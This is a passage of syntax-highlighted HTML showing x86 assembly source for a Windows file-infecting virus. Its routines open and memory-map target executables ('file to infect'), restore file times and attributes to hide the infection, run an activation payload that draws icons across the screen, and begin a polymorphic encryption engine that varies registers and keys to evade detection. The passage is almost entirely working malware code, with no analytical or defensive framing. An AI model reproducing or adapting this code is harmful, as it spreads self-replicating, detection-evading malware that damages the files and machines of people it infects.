                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Open file and create it memory mapped image</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">open_map_file</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;my_FindData - FindData about file</span><span class="sc0">
                </span><span class="sc1">;szWorkDir   - Buffer for path + name of file to infect</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;eax - Base address of memory map for file</span><span class="sc0">
                </span><span class="sc1">;      00000000h if error</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc1">;Reset attributes so we can get read/write access</span><span class="sc0">
                </span><span class="sc1">;to target file</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szWorkDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_SetFileAttr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit_open_map</span><span class="sc0">

                </span><span class="sc1">;Open existing file</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szWorkDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_CreateFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_CreateFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit_open_map</span><span class="sc0">

                </span><span class="sc1">;Create filemapping over file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFile_h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFile_h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_CreateFileMap</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Close_Create</span><span class="sc0">

                </span><span class="sc1">;Map file in memory, get base address</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mapping_h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mapping_h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Close_Mapping</span><span class="sc0">                
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Unmap memory mapped its associated file and close file handle</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">unmap_close</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;eax - File base address in memory</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;None</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_UnmapView</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Close_Mapping</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Close handle created by CreateFileMappingA</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mapping_h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_CloseHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Close_Create</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Restore file time</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData.WFD_ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFile_h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_SetFileTime</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Close handle created by CreateFileA</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFile_h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_CloseHandle</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Restore file attributes</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData.WFD_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szWorkDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_SetFileAttr</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">exit_open_map</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Activation routine</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;Use LoadLibrary to get a valid handle over USER32.dll</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szUSER32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_LoadLibrary</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit_payload</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_User32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Get entry-point for LoadIcon</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szLoadIcon</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetProcAddr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit_payload</span><span class="sc0">

                </span><span class="sc1">;Load custom icon</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">32513</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit_payload</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">h_icon</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Get entry-point for GetDC</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szGetDC</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_User32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetProcAddr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit_payload</span><span class="sc0">

                </span><span class="sc1">;Get device context for the screen</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit_payload</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dc_screen</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Get entry-point for DrawIcon</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szDrawIcon</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_User32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetProcAddr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit_payload</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000100h</span><span class="sc0">

</span><span class="sc5">loop_payload</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Draw some icons in random coordinates</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">h_icon</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000800h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000400h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dc_screen</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_payload</span><span class="sc0">

                </span><span class="sc1">;Print</span><span class="sc0">

</span><span class="sc5">exit_payload</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate polymorphic encryption</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">mutate</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">;Initialize reg flags and random number generator</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">init_poly</span><span class="sc0">

                </span><span class="sc1">;Select index reg</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_IS_INDEX</span><span class="sc0">

                </span><span class="sc1">;Select counter reg</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_IS_COUNTER</span><span class="sc0">

                </span><span class="sc1">;Get and save random displacement</span><span class="sc0">
                </span><span class="sc1">;Do not use any displacement if this field value is null</span><span class="sc0">
                
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_disp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">                
</span><span class="sc5">ok_disp</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Now get a random key</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_key</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Now get some flags</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Get size for INC/DEC procedures</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_size_ok</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_size_ok</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
